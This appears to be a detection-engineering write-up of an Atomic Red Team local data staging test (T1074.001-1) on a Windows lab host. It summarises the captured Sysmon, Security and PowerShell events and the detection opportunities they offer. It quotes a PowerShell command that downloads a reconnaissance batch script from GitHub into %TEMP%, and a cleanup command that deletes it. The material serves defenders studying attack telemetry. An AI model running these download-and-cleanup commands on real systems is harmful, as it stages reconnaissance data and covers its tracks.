# T1074.001-1: Local Data Staging — Stage Data from Discovery.bat

## Technique Context

T1074.001 (Data Staged: Local Data Staging) describes adversaries collecting data from a compromised system and consolidating it in a single location on the same host before exfiltration. The staging step is a natural intermediate phase in the collection kill chain: after identifying valuable data (via Discovery techniques), an adversary aggregates it — to a temp directory, a hidden folder, or an archive — prior to exfiltrating it through whichever channel they have available.

`Discovery.bat` is a Red Canary / Atomic Red Team script that automates a broad suite of system reconnaissance commands: it queries network configuration, user account information, running processes, installed software, and domain information, redirecting all output to a file in `%TEMP%`. The resulting output file is the "staged" artifact — a comprehensive local snapshot of system state ready for exfiltration.

This test models what a real adversary would do immediately after establishing access and before attempting to move data off the endpoint: run an automated discovery script, collect everything into one file, then clean up.

## What This Dataset Contains

This dataset captures the full execution of the ART T1074.001-1 test on a Windows 11 Enterprise domain workstation (ACME-WS06.acme.local) with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The Security log (EID 4688) records two distinct PowerShell process launches with full command lines:

**Stage 1 — Download and execute Discovery.bat:**
```
"powershell.exe" & {Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat}
```

**Stage 2 — Cleanup:**
```
"powershell.exe" & {Remove-Item -Force $env:TEMP\discovery.bat -ErrorAction Ignore}
```

The test downloads `discovery.bat` from the canonical ART GitHub repository directly to `%TEMP%\discovery.bat` via `Invoke-WebRequest`. The Sysmon EID 22 (DNS) event shows the DNS resolution for `raw.githubusercontent.com` completing successfully (QueryStatus 0), confirming the download reached the external endpoint.

The Sysmon EID 3 (network connection) event confirms an outbound HTTPS connection was made — the script reached GitHub CDN infrastructure to retrieve the file. This is a network indicator that distinguishes this test from an offline staging scenario.

The Security channel (12 EID 4688 events) is dominated by `mscorsvw.exe` NGen worker processes, reflecting .NET background compilation triggered by PowerShell's managed runtime activity. The non-mscorsvw processes visible are the two PowerShell invocations and `whoami.exe` (run by the ART test framework for pre-execution context).

The Sysmon channel (47 events) breaks down as: 22 EID 11 (file creates), 13 EID 7 (image loads), 4 EID 1 (process creates), 4 EID 10 (process access), 2 EID 17 (named pipe creates), 1 EID 3 (network), and 1 EID 22 (DNS). The file creation events are primarily `mscorsvw.exe` writing NGen cache entries, along with the PowerShell profile data file: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive`.

The PowerShell channel contains 96 EID 4104 events and 1 EID 4103 event. The 4103 event (module logging) supplements the script block logs with execution context. The ART test framework boilerplate (`Import-Module`, `Invoke-AtomicTest` cleanup) is captured in the script block logs.

Compared to the defended dataset (36 sysmon, 8 security, 39 PowerShell events), this undefended capture is larger across all channels because Defender's AMSI and real-time protection no longer interrupt execution or suppress logging.

## What This Dataset Does Not Contain

The actual execution of `discovery.bat` itself — its child processes (e.g., `ipconfig`, `net user`, `systeminfo`, `tasklist`, `net view`, etc.) — is not fully visible in the event samples here. The bat file was downloaded but the ART test's batch execution phase may have occurred outside the precise capture window represented in these samples, or the child processes spawned by `cmd.exe /c discovery.bat` were not captured in the 20-event sample.

The staged output file (`%TEMP%\discovery.bat` output redirected to a staging file) is not visible as a distinct Sysmon EID 11 event in the samples shown. The cleanup command explicitly removes `%TEMP%\discovery.bat`, but the discovery output file itself (if the bat script ran to completion) would be a separate artifact.

No exfiltration activity is captured — this test only exercises the staging phase.

## Assessment

This dataset provides clear telemetry for both the pre-staging download (PowerShell `Invoke-WebRequest` to GitHub with DNS resolution and network connection observable) and the cleanup (file deletion via `Remove-Item`). The full command lines are captured in the EID 4688 process creation events, making both the source URL and destination path visible.

The network visibility in this dataset is particularly valuable: the Sysmon EID 22 and EID 3 events show an outbound connection to `raw.githubusercontent.com` from a PowerShell process running as SYSTEM, which is an anomalous pattern even in environments that allow general web access. In the defended dataset, this connection may have been blocked by Defender's network protection feature, making the undefended version the complete picture of what this test actually does.

The dataset reflects a common real-world pattern: an attacker who has achieved SYSTEM-level code execution downloads a reconnaissance/staging script from an external repository, executes it, and then cleans up the script (but may leave the output file). The evidence chain — DNS resolution, network connection, file download, process execution — is preserved across multiple telemetry sources.

## Detection Opportunities Present in This Data

**Security EID 4688 / Sysmon EID 1 — PowerShell with Invoke-WebRequest targeting GitHub:** The command line `Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/..." -OutFile $env:TEMP\discovery.bat` is recorded in full. PowerShell downloading executables or scripts to `%TEMP%` from raw.githubusercontent.com is a well-established indicator of offense framework delivery.

**Sysmon EID 22 — DNS query for raw.githubusercontent.com:** A DNS query for `raw.githubusercontent.com` from a PowerShell process running as SYSTEM is recorded. This resolves successfully (QueryStatus 0) with GitHub CDN IP addresses (`185.199.110.133`, `185.199.111.133`, `185.199.108.133`, `185.199.109.133`). While individual users browsing GitHub is normal, SYSTEM-level PowerShell querying raw content endpoints is not routine workstation activity.

**Sysmon EID 3 — Network connection to GitHub CDN:** The EID 3 event confirms the outbound HTTPS connection was established from the PowerShell process. The combination of EID 22 (DNS) + EID 3 (connection) provides both pre-connection and post-connection visibility into the download.

**Process lineage — PowerShell spawned from SYSTEM context:** Both the download and the cleanup PowerShell invocations run as `NT AUTHORITY\SYSTEM` without an interactive logon session. This is not how a normal user would download and execute files.

**Security EID 4688 — Cleanup via Remove-Item:** The cleanup command `Remove-Item -Force $env:TEMP\discovery.bat` is explicitly logged. When cleanup commands appear in process creation logs, they indicate the attacker is attempting to reduce forensic evidence — the presence of a cleanup command is itself a behavioral indicator.

**Sysmon EID 17 — Named pipe creation:** The PSHost pipes created under SYSTEM confirm non-interactive headless PowerShell execution, useful for correlating across the activity timeline.
